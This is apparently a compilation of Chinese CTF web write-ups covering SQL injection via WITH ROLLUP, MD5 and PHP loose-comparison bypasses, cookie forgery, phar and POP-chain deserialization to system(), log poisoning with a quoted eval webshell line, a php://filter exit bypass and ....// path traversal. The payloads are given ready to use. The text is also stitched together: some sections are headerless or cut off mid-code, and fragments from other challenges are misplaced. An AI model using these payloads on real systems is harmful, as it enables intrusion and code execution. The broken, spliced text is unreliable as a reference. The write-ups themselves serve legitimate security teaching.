    ctfshow web10 — 用 WITH ROLLUP 造一个 NULL 密码

    题目类型：Web — SQL 注入（黑名单 + 长度校验）

    题目地址：ctfshow 入门 Web10

    Flag：ctfshow{fe48aa87-a2ba-4293-a096-5812a866ae77}

    题目概述

    一个登录框。登录按钮旁边有个「取消」，点它直接把源码下载下来了。

    拿到源码之后，这题就变成了一道「读代码」的题。

    解题过程

    Step 1：源码先给全了

    function replaceSpecialChar($strParam){
    $regex = "/(select|from|where|join|sleep|and|\s|union|,)/i";
    return preg_replace($regex, "", $strParam);
}

if (strlen($username) != strlen(replaceSpecialChar($username))) {
    die("sql inject error");
}
if (strlen($password) != strlen(replaceSpecialChar($password))) {
    die("sql inject error");
}

$sql = "select * from user where username = '$username'";
$result = mysqli_query($con, $sql);
if (mysqli_num_rows($result) > 0) {
    while ($row = mysqli_fetch_assoc($result)) {
        if ($password == $row['password']) {
            echo "登陆成功<br>";
            echo $flag;
        }
    }
}

    Step 2：这道题有两条互相配合的防线

    ① 黑名单是「替换为空」，删掉：

    select  from  where  join  sleep  and  \s（所有空白）  union  ,

    ② 更狠的是第二道：删完还要比长度

    strlen($username) != strlen(replaceSpecialChar($username))  →  直接 die

    这意味着：你的输入里一个被黑名单命中的子串都不能有** —— 只要有一个字符被删掉，长度就对不上，直接报 sql inject error。**

    所以「双写绕过」在这题是完全无效的：

    seleselectct   →  删掉中间的 select 后变短 → 长度不等 → die

    Step 3：但 password 根本没进 SQL

    看这一行：

    $sql = "select * from user where username = '$username'";   // 只有 username

    password 不拼 SQL。它是在 PHP 里做松散比较：

    if ($password == $row['password'])

    所以思路要拆成两步：

    ① username 注入  →  让查询返回一行
② 那一行的 password  →  和我发过去的 password 用 == 相等

    Step 4：把 password 变成 NULL

    如果查询能返回一行「password 是 NULL」，那我们要发的 password 就是空：

    '' == NULL   →   true      // PHP 7 的松散比较

    怎么让查询返回 NULL？用 WITH ROLLUP。

    Step 5：WITH ROLLUP 是什么

    它是 GROUP BY 的修饰符，用来多产出一行汇总行：

    select * from user group by password with rollup;

    password
e10adc3949ba59abbe56e057f20f883e
5f4dcc3b5aa765d61d8327deb882cf99
NULL                              ← 汇总行

    规则：汇总行里，被 GROUP BY 的那一列会变成 NULL。

    所以这里必须 group by password，不能 group by username：

    group by username with rollup
     → 汇总行: username=NULL，password=某一行的真实值   ✗ 拿到的还是哈希

group by password with rollup
     → 汇总行: password=NULL，username=某一行的值       ✓ 正是我们要的

    因为 SELECT * 取所有列，没被分组的列在汇总行里取的是组内某一行的值 —— 只有被分组的那列才是 NULL。

    Step 6：为什么还需要 or 1=1

    WITH ROLLUP 的汇总行是「在分组结果之上再加一行」，它需要先有分组。

    where username = 'admin' group by password with rollup

    如果 admin 这个用户不存在（或者你不确定它在不在），WHERE 一行都匹配不到 → 没有分组 → 也就没有汇总行 → 拿不到 NULL。

    加上 or 1=1：

    where username = 'admin' or 1=1 group by password with rollup

    WHERE 恒真 → 表里所有行都进来 → 必有分组 → 汇总行必然出现。

    一句话：or 1=1 让整条链不依赖具体用户名是否存在。

    Step 7：空格被过滤，用 /**/

    \s 在黑名单里 —— 空格、Tab、换行全被删。

    但 MySQL 里 /**/ 等价于空白，而且它不在黑名单：

    admin'or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#

    strlen 检查通过（没有字符被删），MySQL 又把它当空格 ✓

    Step 8：payload 与结果

    username = admin'or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#
password = （留空）

    SQL 拼出来是：

    select * from user where username = 'admin'or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#'
                                                                                                 ↑
                                                                                    # 把模板这个 ' 注释掉

    查询返回若干分组行 + 一行 password=NULL 的汇总行 → 空 password 与 NULL 相等 → flag：

    ctfshow{fe48aa87-a2ba-4293-a096-5812a866ae77}

    解题思路总结

    登录框旁边有「取消」→ 点它下载源码
  → 审计：黑名单替换为空 + 长度校验（双写无效）
    → 但 password 不拼 SQL，只在 PHP 里弱比较
      → 那就想办法让查询返回一行 password=NULL
        → WITH ROLLUP 的汇总行会把分组列置 NULL
          → 所以要 group by password（不是 username）
            → 但要先有分组 → 加 or 1=1 让 WHERE 恒真
              → 空格被过滤 → 用 /**/ 代替
                → 空 password == NULL → flag

    漏洞原理

    两个「错位」叠在一起：

    ① 过滤器的「替换」与校验的「长度」不自洽

    黑名单用 preg_replace 删关键字，再用 strlen 比对长度 —— 于是"用了关键字"和"没用关键字"可以被区分。

    但它只挡住了关键字，没挡住注释（/**/）和逻辑运算符（or）。

    ② PHP 的弱比较允许 NULL 与空串相等

    '' == NULL   →   true

    数据库里"这行的值未知/没有"，到了 PHP 里被当成"空字符串"，于是空密码就"匹配"了。

    这和 0e 碰撞、md5(array) 是同一类问题：比较时发生了类型转换，而转换后的值由攻击者控制。**

    关键知识点

    知识点 说明
    WITH ROLLUP GROUP BY 的修饰符，多产出一行汇总行
    汇总行的 NULL 被 GROUP BY 的那一列变成 NULL
    group by password 想让 password 变 NULL，就必须按 password 分组
    空结果集 没有分组就没有汇总行 → 所以需要 or 1=1
    /**/ MySQL 里等价于空白，绕过 \s 过滤
    '' == NULL PHP 7 为 true（'0' == NULL 为 false）
    长度校验的意义 让「双写绕过」失效 —— 删一个字符就报错
    # 注释 屏蔽模板末尾的 '；POST body 里直接写，不用编码（放 URL 里才要写成 %23）
    password 不在 SQL 里 只参与 PHP 比较 → 所以要改的是「查出来的值」
    完整源码（按截图整理） 
    <?php
$flag = "";
function replaceSpecialChar($strParam){
    $regex = "/(select|from|where|join|sleep|and|\s|union|,)/i";
    return preg_replace($regex, "", $strParam);
}

    die('Could not connect: ' . mysqli_error());
}

    die("sql inject error");

    die("sql inject error");
}

    while ($row = mysqli_fetch_assoc($result)) {

            echo "登陆成功<br>";

    EasyMD5 — 三种比较，三条绕过

    题目类型：Web — MD5 特性 / 弱类型 / SQL 注入

    题目地址：BUUCTF EasyMD5（ctf2 复刻环境）

    Flag：CTF2{028c2bd1-33f7-401b-b299-1525fd86cf41}

    题目概述

    刚进来就是一个查询页面，一个输入框加一个「提交查询」按钮，源码里什么也没有。

    后面还有两关，一共三层，每层考一种不同的绕过。

    解题过程

    Step 1：先是完全没头绪

    看着像查询框，先试各种 SQL 注入 —— 页面一点动静都没有。

    又用 dirsearch 扫了一下，还是没东西。

    最后抓包发出去，看响应头，发现了 hint。

    Step 2：Hint 在响应头里

    Hint: select * from 'admin' where password=md5($pass, true)

    注意 md5($pass, **true**) 这个第二个参数。

    md5($s, false)  →  32 位十六进制字符串（平时用的那种）
md5($s, true)   →  16 字节的原始二进制

    平时我们见到的 md5 结果都是 32 个字符，那是因为默认把它编码成十六进制了。true 返回的是原始字节** —— 而这些字节里可以出现引号、反斜杠等特殊字符。**

    也就是说：MD5 的结果可能污染 SQL 语句。**

    Step 3：构造一个永真式

    SQL 拼出来是：

    select * from 'admin' where password='<md5 的原始字节>'

    如果 md5 的原始字节以 'or' 开头，就变成了：

    where password=''or'6...'
                └──┘ └──── 非空字符串 → 真

    '' or '任意非空字符串' 恒为真 → 直接登录进去。

    本机验证：

    md5('ffifdyop', true)
= 276f722736c95d99e921722cf9ed621c
可打印形式： 'or'6.]..!r,..b.

    所以第一关的答案就是 ffifdyop。

    Step 4：第二关 —— 松散不等 + 弱相等

    $a = $_GET['a'];
$b = $_GET['b'];
if ($a != $b && md5($a) == md5($b)) {
    // wow, glzjin wants a girl friend.
}

    两个条件：

    $a != $b          松散不等（数组、'1' 和 1 都算相等）
md5($a) == md5($b) 松散相等

    两条路都能过：

    ① 0e 碰撞

    两个不同的字符串，MD5 后都以 0e 开头且后面全是数字 → 被当成科学计数法比较 → 都等于 0。

    QNKCDZO      → 0e830400451993494058024219903391
240610708    → 0e462097431906509019562988736854

    ② 数组

    ?a[]=1&b[]=2

    md5(array) 在 PHP 7 里报个 warning 然后返回 NULL —— 两边都是 NULL，NULL == NULL 成立。

    Step 5：第三关 —— 严格不等 + 强相等

    if ($_POST['param1'] !== $_POST['param2'] && md5($_POST['param1']) === md5($_POST['param2'])) {
    echo $flag;
}

    !== 和 === 都不做类型转换 —— 这才是关键。

    0e 那条路断了：字符串 === 比较要求完全相同。

    但数组还能用：

    param1[]=1&param2[]=2
    表达式 结果 原因
    param1 !== param2 true 两个数组元素不同
    md5(param1) === md5(param2) true 两边都是 NULL，NULL === NULL

    注意：md5(array) 在 PHP 8 会直接抛 TypeError（致命错误）—— 这招只在 PHP 7 上成立。

    Step 6：拿 flag

    CTF2{028c2bd1-33f7-401b-b299-1525fd86cf41}

    解题思路总结

    页面只有一个查询框 → 试 SQL 注入没反应 → 抓包看响应头
  → Hint: password=md5($pass, true)
    → md5 第二参数 true 返回 16 字节原始二进制
      → 原始字节可含引号 → SQL 注入
        → ffifdyop 的原始 md5 以 'or'6 开头 → 永真 → 第一关过
          → 第二关：!= 和 == → 0e 碰撞 或 数组
            → 第三关：!== 和 === → 只能数组
              → flag

    漏洞原理

    三关考的都是"比较时发生了什么"，但三种比较的严格程度不同：

    写法 含义 能被什么打败
    != / == 松散比较，先转类型再比 类型转换（0e 科学计数法、'1' == 1）
    !== / === 严格比较，类型和值都要一样 类型本身被改变（数组 → md5 返回 NULL）
    md5($x, true) 返回原始字节而非十六进制 原始字节里可以长成 SQL 语法的一部分

    一句话：== 骗的是"值"，=== 骗不了值 —— 但可以骗"类型"。**

    关键知识点

    知识点 说明
    md5($s, true) 返回 16 字节原始二进制（可含 ' \ 等字符）
    ffifdyop 它的原始 MD5 以 'or'6 开头，是万能密码的经典 payload
    0e 碰撞 QNKCDZO / 240610708 / aabg7XSs 等，MD5 都是 0e 开头纯数字
    md5(array) PHP 7：warning + 返回 NULL；PHP 8：TypeError
    NULL 比较 NULL == NULL 真，NULL === NULL 也真
    Hint 藏响应头 页面没反应不代表没线索，抓包看头
    松散 vs 严格 == 转类型；=== 不转（但类型可以被函数返回值改变）

    [极客大挑战 2019] BuyFlag — 三个小关卡，三种绕过

    题目类型：Web — PHP 弱类型 / Cookie 伪造 / 科学计数法

    题目地址：极客大挑战 2019 BuyFlag（ctf2 复刻环境）

    Flag：CTF2{439654d3-720c-4ee9-b0f8-9dd67c5b8ab9}

    题目概述

    一个「买 flag」的页面。要拿到 flag，得同时满足三个条件：

    ① 密码要对
② 必须是 CUIT 的学生
③ 钱要够

    三个条件分别对应三种不同的绕过方式 —— 这题的价值就在这儿。

    解题过程

    Step 1：查看源码，发现 pay.php

    查看页面源码，发现存在 pay.php。进去之后继续看源码：

    <!--
~~~post money and password~~~
-->
if (isset($_POST['password'])) {
    $password = $_POST['password'];
    if (is_numeric($password)) {
        echo "password can't be number</br>";
    } elseif ($password == 404) {
        echo "Password Right!</br>";
    }
}

    第一个条件：

    · 不能是纯数字              → is_numeric 挡住 "404"
· 但要松散等于 404          → $password == 404

    看起来矛盾，其实不矛盾 —— 因为 is_numeric 看的是“整个字符串是不是数字”，== 看的是“转换成数字后等不等”。

    payload：404a

    is_numeric("404a")  →  false     ✅ 过第一关
"404a" == 404       →  PHP 7 把开头的数字部分转成 404 → true   ✅ 过第二关

    ⚠️ 这条只在 PHP 7 成立。PHP 8 改了比较规则（数字与非数字字符串比较时按字符串比），"404a" == 404 会变成 false。

    Step 2：提示「必须是 CUIT 的学生」

    发包后页面说：

    Only Cuit's students can buy the FLAG

    先想一个问题：服务端凭什么知道我是谁？

    看请求头 —— 里面有个 Cookie: user=0。

    身份就是它判的，而它是我们自己的。改成 user=1 就行。

    这类「把身份放在客户端」的题，判断依据永远是那句：服务端相信了客户端送来的、可以随便改的东西。

    Step 3：还有 money

    再往后看，还差钱：

    Flag need your 100000000 money

    于是请求体里补一个 money 参数。

    但直接写 money=100000000 会被挡 —— 提示「数字太长了」（源码里有长度限制）。

    解法是科学计数法：

    money=10e8

    10e8 只有 4 个字符，但它的值是 10 × 10^8 = 10^9，足够达到 100000000 的门槛。

    这就是「字符串长度和数值大小是两回事」的利用点 —— 和第一关的 404a 是同一个套路：检查看的是一种东西，使用时是另一种东西。

    Step 4：三个条件一起满足

    POST /pay.php HTTP/1.1
Cookie: user=1
Content-Type: application/x-www-form-urlencoded

password=404a&money=10e8

    响应里就出 flag 了：

    you are Cuiter
Password Right!
CTF2{439654d3-720c-4ee9-b0f8-9dd67c5b8ab9}

    解题思路总结

    查看源码 → 发现 pay.php → 读它的判断逻辑
  → ① 密码：不能是数字，又要 == 404
        → is_numeric 与 == 看到的不是同一个东西 → 404a
    ② 身份：Cookie: user=0 → 改成 1（客户端说了算）
    ③ 钱：要 100000000 但长度受限 → 科学计数法 10e8
      三个条件一起发 → flag

    漏洞原理

    这题三个关卡，本质是同一件事的三次重复：

    关卡 检查看的是 实际用的是 差异点
    密码 is_numeric 判断“整体是否数字” == 做数值转换 404a 整体不是数字，但转换后是 404
    身份 服务端相信 Cookie 请求里的 user 客户端可控
    钱 strlen 判断字符串长度 数值比较 10e8 短但大

    三条合起来就是一句：校验函数和使用点读的不是同一个东西，而你能控制中间那个“东西”。**

    关键知识点

    知识点 说明
    is_numeric('404a') false —— 只认完整数字
    '404a' == 404 PHP 7 为 true（取前导数字）；PHP 8 为 false
    PHP 8 比较规则变化 数字 vs 非数字字符串 → 按字符串比较，弱类型绕过大量失效
    Cookie 伪造 身份标识存在客户端 → 直接改
    科学计数法 10e8 = 1e9，字符短、数值大
    strlen vs 数值 长度检查挡不住科学计数法
    通用模型 检查点看到的类型/值与使用点看到的不同
    pay.php 关键判断（按截图整理）

        echo "password can't be number</br>";

        echo "Password Right!</br>";
    }

    Step 5：没有 unserialize()，还有 phar

    这就是 phar 反序列化：

}

    unlink() 正好在受影响函数列表里 —— 只要 filename 是 phar://...，调用 unlink 的那一刻就会触发反序列化。

    Step 7：倒推整条链

    目标是 File::close()。但它没有什么特殊的触发方式，所以要一层层往上找。

    先看 FileList::__call：

    public function __call($func, $args) {
    array_push($this->funcs, $func);
    foreach ($this->files as $file) {
        $this->results[$file->name()][$func] = $file->$func();
    }
}

    $file->$func() 这一句是动态调用 —— 如果我们让 $func = 'close'，那 $file->close() 就被执行了。

    而 __call 的触发条件是：调用了一个不存在的方法。

    再往上看，User::__destruct：

    public function __destruct() {
    $this->db->close();
}

    $this->db 是我们可以控制的属性。只要让它等于一个 FileList 对象，那么 $this->db->close() 就变成了「对 FileList 调用一个它没有的方法 close」→ 正好触发上面的 __call。

User::__destruct()

File::close()
  ↓  file_get_contents('/flag.txt')
结果存进 $results
  ↓
FileList::__destruct()        ← 把 results 输出出来

    漏洞原理

    ① phar 的本质

    phar 是把整个项目打包成一个文件，可以直接 php xxx.phar 运行。它本质是一个包含多个文件的压缩包。

    ② 为什么它能触发反序列化

    phar 的 manifest 里有一段 metadata 区，PHP 在解析 phar 文件时会把它反序列化。

    而「解析 phar 文件」这件事，发生在任何接受路径的文件系统函数收到 phar:// 开头的字符串时 —— 包括 unlink、file_exists、stat、getimagesize 等等。

    所以不需要 unserialize() 这个函数，只要有「我能控制的路径」+「一个文件系统函数」，就能触发。**

    ③ 链的设计思路

    先找终点（能读写文件的语句）
  → 再找入口（能被外部触发的魔术方法）
    → 中间用「动态调用」「属性可控」把它们接起来
      → 最后别忘了：读到了 ≠ 输出了

    题目概述

    一个叫「碰星文件管理」的文档系统，登录页之后是一套像模像样的文件列表、检索、预览界面。

    先看页面有没有可以利用的，到处点了一遍 —— 实际有用的只有一个：文档预览。

    解题过程

    Step 1：找到唯一有用的功能

    页面上按钮很多（新建、上传、回收站、已发布……），但除了预览，全是空壳。

    预览框输入文件名 → 前端发一个请求：

    fetch('index.php?file=' + encodeURIComponent(name), {method:'GET'})

    接口是 index.php?file=，参数名 file。

    Step 2：直接看 index.php 看不到 —— 用伪协议读源码

    ?file=index.php 返回空 —— 因为 include 把它执行了，而不是打印。

    换成 base64 编码滤镜：

    ?file=php://filter/convert.base64-encode/resource=index.php

    读到 2797 字节的源码。关键就在 include 和那条正则上。

    Step 3：cmd 是个陷阱

{
    return system($command);
}

    // 校验通过，命令参数将在文档内容渲染阶段被一并处理
}

    第一眼看像是「命令执行 + WAF」，但拉下去看完整文件会发现：run_maintenance_command() 只有定义，没有调用。

    注释自己也写着「Web 接口层不再直接触发」。

    WAF 保护的是一个什么都不做的空壳 —— 这个入口对我们没有任何实际作用。

    Step 4：真正的终点是 include，它过滤了目录穿越

② 但 file_exists($file) 对绝对路径直接为真 → 绝对路径完全可用

    而且 include 对文件类型的处理不一样：

    include 一个 txt  →  内容原样打印
include 一个 php  →  内容被当代码执行

    Step 5：确认日志路径

    先确认 Apache 还是 nginx 的日志能用：

    ?file=/var/log/apache2/access.log      → 读不到
?file=/var/log/nginx/access.log        → 能读

    但这里有个容易误判的地方 ——文件名写的是 nginx，日志内容却是 Apache 的：

    [Thu Oct 30 ...] [authz_core:error] [pid 23] [client ...]

    authz_core 是 Apache 模块，响应头也写着 Server: Apache/2.4.54 (Debian)。所以文件名只是路径巧合，服务端是 Apache。

    Step 6：access.log 突然 500，只能换 error.log

    一开始对 access.log 用得挺好，后来就一直是 500 —— 原因是别人先注入了一条写坏的 payload：

    script '/var/www/html/<?php eval($_GET['1'];?>.php' not found

    一行的语法错误，就能让整份日志作废（include 时直接 500）。

    Step 7：往 error.log 里注入

    关键：error.log 里那条 script '...' not found 是mod_php 找不到脚本时才写的 —— 只有路径以 .php 结尾才会产生。

    要点 为什么

    payload 带 ?> 不带的话，日志后半截 ' not found... 会被当成 PHP 代码继续解析 → Parse error

    script '/var/www/html/.php' not found

    我一开始以为是 payload 被截断了，其实中间那一截是被 include 执行掉了：

    解题过程

    Step 1：第一关，先看四道检查在拦什么

    首先进行代码审计：

    检查 拦的是 你要满足
    !is_string($num) 数组 传字符串
    $num == 411413 直接输入答案 不能弱等于 411413
    preg_match("/[a-z\.]/i") 所有字母 + 点 不能有 e、x、b
    !strpos($num,"0") 0 在第 0 位 0 必须在后面
    intval($num,0) === 411413 —— 解析后必须等于 411413

    Step 2：确定只剩八进制

    intval($num, 0) 第二个参数为 0，那么就看 num 的开头：

    0x 开头  →  16 进制     ✗ 字母 x 被 [a-z] 拦了
0b 开头  →  2 进制      ✗ 字母 b 被拦了
0 开头   →  8 进制      ✓ 纯数字，只剩这条
其他     →  10 进制     ✗ 十进制真值会等于 411413，被第一道 `==` 拦

    所以这里只能用 8 进制。

    Step 3：但 0 不能是第一个 —— 用换行符

    八进制必须以 0 开头，可 strpos 那道又不许 0 在第 0 位。

    关键在于：intval 会跳过前导空白，而 strpos 不会跳过任何东西 —— 它只是找下标。

    strpos("01443425","0")  = 0   → !0 = true  → 死
strpos("\n01443425","0") = 1  → !1 = false → 活
intval("\n01443425", 0)  = 411413          → 值对

    所以选择用 %0A（换行符）当第一个就可以了。

    Step 4：算数字

    别手算，用 PHP 算：

    php -r "echo base_convert('411413', 10, 8);"

    得到 1443425，前面补 0 就是 01443425。

    payload：?num=%0A01443425

    ⚠️ 数字必须完整。 少一位（比如写成 0144325）intval 会得到 51413，差得非常远。

    Step 5：第二关，<?php exit;?> 是“前缀死刑”

    进来之后源码就很明晰了：

    $written = @file_put_contents(
    $filename,
    "<?php exit;?>" . $content
);

    写出来的文件是这样的：

    <?php exit;?><?php system('cat /f*');?>

    exit; 会在你的代码之前执行，整个请求立刻结束 —— 后面那段永远到不了。

    它不删你的代码，只是让你的代码排不上队。

    Step 6：要改的是 filename，不是 content

    file_put_contents 的第一个参数是文件名，而 PHP 的文件名支持流包装器。所以我能控制的不只是“写到哪”，还有“写入途中经过什么处理”：**

    php://filter/write=<滤镜>/resource=<真实路径>

    这就是这题的突破口 —— 问题不在 content 装不进去，而在写入通道可以被编程。

    Step 7：convert.base64-decode 把前缀变成乱码

    用 convert.base64-decode，数据在落盘前会先做一次 base64 解码。而 base64 解码器的规则是：

    ① 只认 [A-Za-z0-9+/=]
② 其他字符（< ? 空格 ; >）直接丢掉
③ 剩下的每 4 个字符 → 3 字节

    <?php exit;?> 里能留下的只有 phpexit —— 7 个字母：

    [<] 丢弃   [?] 丢弃   [p] 留下   [h] 留下   [p] 留下
[ ] 丢弃   [e] 留下   [x] 留下   [i] 留下   [t] 留下
[;] 丢弃   [?] 丢弃   [>] 丢弃

    留下的 7 个字母会被当成数据解码，变成 6 个乱码字节。

    最终文件变成：

    [6 字节乱码] + [我们自己的 PHP 代码]

    乱码里没有 <，所以 PHP 不会在那里进入代码模式，只是把它当普通字节输出（页面顶部那几个怪字符）；后面我们自己的 <?php 才是第一个被识别的开标签。

    Step 8：必须补字符对齐

    base64 解码要求有效字符数是 4 的倍数。

    7（phpexit）+ 补充字符数 + base64 长度  必须 % 4 == 0
7 + 1 + 32 = 40  ✅
7 + 5 + 32 = 44  ✅   加 5 个凑成 12 也行

    不足 4 的倍数，滤镜会报 invalid byte sequence，写入直接失败。

    所以要在 base64 前面补 1 个字符（或 5 个），跟前面的 7 个凑成 8（或 12）。

    Step 9：把 content= 也编码进去 —— 我踩的第一个坑

    这里我最开始不知道在干嘛，把 content= 也放进去编码了，查询时一直报错，太迷了。

    content=<1 个对齐字符><只含 <?php ... ?> 的 base64>

    字符 是什么 表单里会怎样
    + 字母表第 62 号，真实数据 被当成空格，整个末尾错位
    = 填充符，不是数据 被某些工具当分隔符处理，删掉后末组不完整

    ?> 是两个字节，编成 base64 就是 Pz4= —— 结尾一定带 =。

    所以这里我就删掉了 ?>，反正单个 ; 也能确定语句的结束。

    去掉 ?> 之后，base64 结尾是 Jyk7（纯字母数字），整个值里没有任何会被表单规则特殊对待的字符。

    顺带说：PHP 文件本来就不需要 ?> 结尾，官方也建议省略 —— 这一刀砍得对。

    Flag：SYC{82a8d7ba-d362-4f0e-a49c-22abe6a72b32}

    题目概述

    题目接收 user 和 sign 两个参数，把它们塞进 A 类后序列化、过一遍过滤器，再反序列化：

    $entry = new A($u, $s);
$ser = serialize($entry);
$escaped = filter($ser);
unserialize($escaped);

    过滤器只有一句话：

    function filter($data) {
    return str_replace("admin", "hacker", $data);
}

    admin 5 个字符，hacker 6 个字符 —— 每替换一次，字符串就多一个字节，但序列化串里的长度数字不会跟着变。

    七个类的骨架（完整源码见文末）：

    A  __destruct  →  echo "…" . $this->sign          （把对象当字符串拼接）
B  __toString  →  (string)$func()                 （把对象当函数调用）
C  __invoke    →  $this->target->$m()             （调用不存在的方法）
D  __call      →  return $this->next->$p          （读取不存在的属性）
E  __get       →  $sink->flag_trigger = $cmd      （写私有属性）
F  __set       →  system($value)                  ← 代码执行在这里

    解题过程

    Step 1：先找能执行代码的地方

    审计代码，先找能执行代码的地方，然后倒着推。

    全文只有一个真正的执行点：

    class F {
    private $flag_trigger;
    public function __set($name, $value) {
        if ($name !== 'flag_trigger') return;
        echo "RCE:<br>";
        system($value);          // ← 终点
    }
}

    所以要满足两个条件：$name === 'flag_trigger'，且 $value 是我能控制的字符串。

    Step 2：倒推 —— 谁能写 F 的私有属性

    $flag_trigger 是 private，从类外部写它就会触发 __set。谁在写它？看 E：

    class E {
    public $sink;
    public $cmd;
    public function __get($name) {
        if (!($this->sink instanceof F)) return;
        $this->sink->flag_trigger = $this->cmd;   // ← 写私有属性
    }
}

    E::__get 里写了 $this->sink->flag_trigger —— 只要 sink 是 F 的实例，就会走到 __set，$value 就是 $this->cmd。

    所以 cmd 就是我的命令，从这里传进去。

    Step 3：倒推 —— 谁读 E 的不存在属性

    __get 是在访问不可访问属性时触发的。看 D：

    class D {
    public $next;
    public $property;
    public function __call($name, $arguments) {
        if (!is_object($this->next) || !is_string($this->property)) return '';
        $p = $this->property;
        return $this->next->$p;      // ← 读 $next 的属性 $p
    }
}

    只要 property 写成 E 里不存在的名字（比如 flag），$this->next->$p 就会触发 E::__get。

    E 的两个属性是 sink 和 cmd，所以 property 不能是这两个 —— 我用的是 flag。

    Step 4：倒推 —— 谁调 D 的不存在方法

    __call 在调用不存在的方法时触发。看 C：

    class C {
    public $target;
    public $method;
    public function __invoke() {
        if (!is_object($this->target) || !is_string($this->method)) return '';
        if (!method_exists($this->target, '__call') || method_exists($this->target, $this->method)) return '';
        $m = $this->method;
        return $this->target->$m();      // ← 调 $target 的方法 $m
    }
}

    这里有个反向条件，最容易看错：

    必须 method_exists($target, '__call')        → target 得是有 __call 的类（就是 D）
必须 !method_exists($target, $method)        → 这个方法名不能真的存在

    所以 method 随便写一个 D 里没有的名字就行（我用 flag），这样才会落到 __call。

    Step 5：倒推 —— 谁把对象当函数调用

    __invoke 在对象被当成函数调用时触发。看 B：

    class B {
    public $action;
    public function __toString() {
        if (!is_object($this->action) || !method_exists($this->action, '__invoke')) return '';
        $func = $this->action;
        return (string)$func();          // ← 对象当函数调
    }
}

    action 放 C 的实例，$func() 就会触发 C::__invoke。

    Step 6：倒推 —— 谁把 B 当字符串

    __toString 在对象被当做字符串处理时触发。 看 A：

    class A {
    public $user;
    public $sign;
    public function __destruct() {
        echo "Welcome to Geek_Challenge2026!<br>";
        echo "Profile signature: " . $this->sign . "<br>";   // ← 字符串拼接
    }
}

    $this->sign 用 . 拼接，把对象当字符串 —— 把 B 的实例放进去，就会触发 B::__toString。

    到这里整条链就闭合了：

    A::__destruct  →  B::__toString  →  C::__invoke  →  D::__call  →  E::__get  →  F::__set  →  system()

    Step 8：绕过 __wakeup

    在反序列化时会先调用 __wakeup，然后它会把 $this->action 置为空：

    class B {
    public function __wakeup() {
        echo "唉？你怎么醒了，回去吧你<br>";
        $this->action = null;      // ← 链从这里就断了

    所以这里最后输出序列化串的时候，记得把 B 的属性数加 1 绕过 wakeup 方法。

    实际只有 1 个属性，却写成 2      O:1:"B":2:{s:6:"action";O:1:"C":…}

    原理是 CVE-2016-7124：属性数大于实际个数时，PHP 会跳过 __wakeup。只在 PHP < 5.6.25 / 7.0.10 有效 —— 这题能过，说明目标 PHP 就在这个范围内。

    Step 9：为什么是 192 —— 长度扩张

    前面序列化一次、过滤一次，问题出在过滤改变了字符串长度，但长度数字没变。

    设 A = admin 的个数，b = 注入的那串（";s:4:"sign";O:1:"B":2:{…）：

    过滤前   声明长度 N = 5A + len(b)
过滤后   实际长度   = 6A + len(b)      （每个 admin 多 1 字节）
解析器   只读 N 个字节 → 落在 5A + len(b) 这个位置

    注入的 "; 在 b 的开头，也就是过滤后的 6A 处。要让解析器正好读到这里，需要：

    5A + len(b) = 6A     →     A = len(b)

    所以「192」不是随便挑的 —— 它同时是 b 的长度和 admin 的个数。

unserialize() 按串里写的长度去读 —— 读的位置被"多出来的字节"整体推后

    知识点 说明
    找终点 审计先找执行点（system / eval / include / call_user_func），再倒着推
    POP 链 利用属性把对象串起来，靠魔术方法的自动触发一层层走到终点
    反向条件 !method_exists($target, $method) —— 要求方法名不存在，最容易看错
    __wakeup 绕过 序列化串里属性数写大于实际个数（CVE-2016-7124，PHP < 5.6.25 / 7.0.10）
    长度扩张 过滤器把短串换成长串，序列化串里的长度数字不变 → 解析位置错位
    长度对齐 admin 的个数必须等于注入串的长度，解析器才会正好停在注入的 "; 上

    方法 触发时机
    __construct() 用于在创建对象时自动触发：当使用 new 关键字实例化一个类时，会自动调用该类的 __construct() 方法
    __destruct() 用于在对象被销毁时自动触发：对象被销毁、引用计数减少为零时触发
    __sleep() 序列化 serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组
    __wakeup() 用于在反序列化对象时自动调用：unserialize() 会检查是否存在一个 __wakeup() 方法，如果存在，则会先调用 __wakeup() 方法
    __toString() 在对象被当做字符串处理时自动调用，比如 echo、==、preg_match()

    __callStatic() 在静态调用或调用成员常量时，使用的方法不存在时触发
    __set() 在给不存在的成员属性赋值时触发
    __isset() 在对不可访问属性使用 isset() 或 empty() 时会被触发

    __clone() 当使用 clone 关键字拷贝完成一个对象后就会触发
    __get() 当尝试访问不可访问属性时会被自动调用

    题目概述

    页面是一个"文件预览器"，输入文件名即可查看实验室资料。默认提供示例文件 hello.txt。

    解题过程

    Step 1：查看默认文件

    先访问默认的 hello.txt，内容如下：

    Hello, ZeroG!
Welcome to PwnStars Cybersecurity Lab.

    没有有用信息，只是普通的欢迎语。

    Step 2：查看源码，发现线索

    右键查看页面源代码，在 HTML 底部发现一行注释：

    <!-- TODO: README.txt 后续需要整理 -->

    这说明服务器上存在一个 README.txt 文件，但页面上没有直接暴露。

    Step 3：直接读取 README.txt — 失败

    在文件名输入框中输入 README.txt，返回：

    File not found.

    说明 README.txt 不在当前可读目录中。

    Step 4：尝试目录穿越

    既然文件不在当前目录，尝试使用 ../ 进行目录穿越：

    ../README.txt

    仍然返回 File not found.，说明服务器对 ../ 进行了过滤（替换为空）。

    Step 5：绕过过滤 — 成功读取 README.txt

    服务器只做了一次 ../ → 空的替换，可以利用双写绕过。输入：

    ....//README.txt

    服务器将中间的 ../ 删除后，剩余字符重新拼成 ../README.txt，成功读到文件内容：

    Stitch File Preview System

Public files are stored in /files/.

For administrators:

Sensitive files are stored in /secret/.

    README.txt 揭示了目录结构：

    • 公开文件存储在 /files/
    • 敏感文件存储在 /secret/

    Step 6：读取 /secret/ 下的 flag

    既然知道敏感文件在 /secret/ 目录下，CTF 中常见的 flag 文件名就是 flag.txt。使用同样的绕过方式构造路径：

    ....//secret/flag.txt

    成功拿到 flag：

    flag{1f0be3ba-b8f6-4a5a-9b05-c8d69e8769fd}

    解题思路总结

    访问 hello.txt（无有用信息）
  → 查看源码，发现 HTML 注释提到 README.txt
    → 直接读 README.txt 失败（文件不在当前目录）
      → 尝试 ../ 目录穿越，失败（被过滤）
        → 用 ....// 双写绕过过滤，成功读取 README.txt
          → 发现敏感文件在 /secret/ 目录
            → ....//secret/flag.txt 读到 flag

    漏洞原理

